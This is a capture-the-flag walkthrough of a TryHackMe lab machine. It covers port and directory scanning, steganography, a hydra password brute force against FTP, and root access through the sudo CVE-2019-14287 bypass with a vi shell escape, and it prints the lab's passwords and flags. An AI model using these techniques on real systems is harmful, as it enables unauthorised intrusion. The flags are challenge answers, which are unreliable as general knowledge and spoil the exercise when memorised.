#### Scanning

nmap -Pn -A -T4 10.10.147.74                                          255 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-01 13:42 EST
Nmap scan report for 10.10.147.74
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds


#### Gobuster

gobuster dir -u 10.10.147.74 -w /usr/share/wordlists/dirb/common.txt -e php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.147.74
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/01 13:42:32 Starting gobuster
===============================================================
http://10.10.147.74/.htpasswd (Status: 403)
http://10.10.147.74/.hta (Status: 403)
http://10.10.147.74/.htaccess (Status: 403)
http://10.10.147.74/assets (Status: 301)
http://10.10.147.74/index.html (Status: 200)
http://10.10.147.74/server-status (Status: 403)
===============================================================
2021/02/01 13:44:54 Finished
===============================================================




#### accessing /assets

I download a video and in the same time read `style.css` which contains a clue:

```
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
```

#### Checking /sup3r_s3cr3t_fl4g.php

I run burp and intercept a response with a link to hidden website:


GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: 10.10.147.74
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


It is written to disable javascript in a browser so in Firefox:

about:config ---> javvascript enabled ---> I switched to false

After checking a video it turns out to be a rabbit hole, however

I go to

http://10.10.147.74/WExYY2Cv-qU/

which has some jpg inside

I download it and run couple of tools which give nothing: binwalk, steghide, exiftools.

Finally zsteg gives something

```
Watch out for red output. This tool shows lots of false positives...
[?] 1244 bytes of extra data after image end (IEND), offset = 0x73ae7
extradata:0         .. text: "Ot9RrG7h2~24?\nEh, you've earned this. Username for FTP is ftpuser\nOne of these is the password
```

#### Bruteforcing ftp

I have a username `ftpuser` to ftp so let's run hydra and bruteforce a password:

`hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 10.10.147.74 ftp`

After a very long time hydra find the password `5iez1wGXKfPKQ`

I login to ftp and download `Eli's_Creds.txt`

ftp 10.10.147.74
Connected to 10.10.147.74.
220 (vsFTPd 3.0.2)
Name (10.10.147.74:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (1.9432 MB/s)
ftp> 

#### Checking txt file

I cat a file and get some symbols:

cat Eli\'s_Creds.txt 
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <

This is called Brainfuck. I access an online translator available here:

https://www.splitbrain.org/_static/ook/

and after decoding gett credentials:

User: eli
Password: DSpDiM1wAEwid

#### SSH as eli

Once I ssh there is a message:

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

My first thought was to simply type `

`locate s3cr3t`

and it seemed to work:

```
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```

After cat I get a password:

```
cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```
#### Switching to gwendoline

I su to gwendoline and read user.txt

gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}


#### Escalate to root

I check sudo -l but there is nothing useful:

```
sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

We can use sudo with any user except of root. However, there is a vulnerability CVE-2019-14287 which can help us here.

Briefly speaking, sudo reverts to user 0 (root) when we choose user -1 so:

```

`gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`

and then `:` and `!/bin/bash` which made me root:

```

Makes us root:

```
root@year-of-the-rabbit:/home/gwendoline# cat /root/root.txt 
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```
